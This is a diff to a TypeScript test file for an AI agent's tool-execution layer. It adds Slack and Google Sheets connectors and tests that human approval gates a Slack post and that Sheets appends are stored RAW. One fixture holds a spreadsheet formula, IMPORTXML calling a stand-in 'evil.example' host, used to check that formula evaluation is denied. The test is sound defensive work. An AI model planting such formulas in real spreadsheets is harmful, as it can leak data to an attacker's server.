@@ -14,6 +14,8 @@ const MODEL = 'anthropic/claude-haiku-5.5';
 const LOCK = {
   GMAIL_SEND_EMAIL: { toolkit: 'gmail', version: '20260101_00', verifiedAt: '2026-10-01', params: ['recipient_email', 'subject', 'body', 'cc'] },
   GMAIL_FETCH_EMAILS: { toolkit: 'gmail', version: '20260101_00', verifiedAt: '2026-10-01', params: ['query', 'max_results'] },
+  SLACK_SEND_MESSAGE: { toolkit: 'slack', version: '20260101_00', verifiedAt: '2026-10-01', params: ['channel', 'markdown_text', 'thread_ts', 'blocks'] },
+  GOOGLESHEETS_SPREADSHEETS_VALUES_APPEND: { toolkit: 'googlesheets', version: '20260101_00', verifiedAt: '2026-10-01', params: ['spreadsheetId', 'range', 'values', 'valueInputOption'] },
 };
 
 function usage(cost: bigint | null = 1_000n) {
@@ -219,6 +221,39 @@ describe('activities (PGlite + fake Gateway/Composio)', () => {
     await h.db.update(schema.connectedAccounts).set({ status: 'revoked' }).where(eq(schema.connectedAccounts.id, connId));
     expect((await h.acts.executeApprovedAction({ taskId, ownerId, toolCallId: `${taskId}:c1`, intentId: v.intentId })).state).toBe('failed');
     expect(h.connectorCalls).toHaveLength(0);
+  });
+
+  it('a Slack post is approval-gated, shows its channel, and runs once with the exact args', async () => {
+    const { taskId, ownerId } = await seed(h);
+    await h.db.insert(schema.connectedAccounts).values({ ownerId, toolkit: 'slack', composioUserId: 'sa_user_alice', composioConnectedAccountId: 'ca_alice_slack', status: 'active', lastVerifiedAt: new Date() });
+    const args = { channel: 'C0123', markdown_text: 'Ship it' };
+    h.script.push(toolCallOutput('c1', 'slack_send_message', args));
+    await h.acts.modelDecision({ taskId, ownerId, step: 0 });
+    expect(h.modelCalls[0]!.tools.map((t) => t.name)).toContain('slack_send_message');
+    const v = await h.acts.evaluateProposal({ taskId, ownerId, toolCallId: `${taskId}:c1`, readOnly: false });
+    if (v.verdict !== 'needs_approval') throw new Error('expected approval');
+    expect(h.connectorCalls).toHaveLength(0);
+    const intent = await getIntentForOwner(h.db, ownerId, v.intentId);
+    expect(intent.destination).toEqual({ channel: 'C0123', thread_ts: null });
+    await decideIntent(h.db, ownerId, v.intentId, { decision: 'approved', argsHash: intent.argsHash, nonce: intent.nonce });
+    expect(await h.acts.executeApprovedAction({ taskId, ownerId, toolCallId: `${taskId}:c1`, intentId: v.intentId })).toMatchObject({ state: 'confirmed' });
+    expect(h.connectorCalls).toEqual([{ slug: 'SLACK_SEND_MESSAGE', account: 'ca_alice_slack', args }]);
+  });
+
+  it('a Sheets append is stored RAW and cannot ask for formula evaluation', async () => {
+    const { taskId, ownerId } = await seed(h);
+    await h.db.insert(schema.connectedAccounts).values({ ownerId, toolkit: 'googlesheets', composioUserId: 'sa_user_alice', composioConnectedAccountId: 'ca_alice_sheets', status: 'active', lastVerifiedAt: new Date() });
+    const row = { spreadsheetId: 'sheet_1', range: 'Sheet1!A1', values: [['=IMPORTXML("https://evil.example")', 1]] };
+    h.script.push(toolCallOutput('c1', 'googlesheets_spreadsheets_values_append', { ...row, valueInputOption: 'USER_ENTERED' }));
+    await h.acts.modelDecision({ taskId, ownerId, step: 0 });
+    expect(await h.acts.evaluateProposal({ taskId, ownerId, toolCallId: `${taskId}:c1`, readOnly: false })).toMatchObject({ verdict: 'deny' });
+    h.script.push(toolCallOutput('c2', 'googlesheets_spreadsheets_values_append', row));
+    await h.acts.modelDecision({ taskId, ownerId, step: 1 });
+    const v = await h.acts.evaluateProposal({ taskId, ownerId, toolCallId: `${taskId}:c2`, readOnly: false });
+    if (v.verdict !== 'needs_approval') throw new Error('expected approval');
+    const intent = await getIntentForOwner(h.db, ownerId, v.intentId);
+    expect(intent.args).toEqual({ ...row, valueInputOption: 'RAW' });
+    expect(intent.destination).toEqual({ spreadsheetId: 'sheet_1', range: 'Sheet1!A1' });
   });
 
   it('another user cannot evaluate or execute a task’s tool calls', async () => {
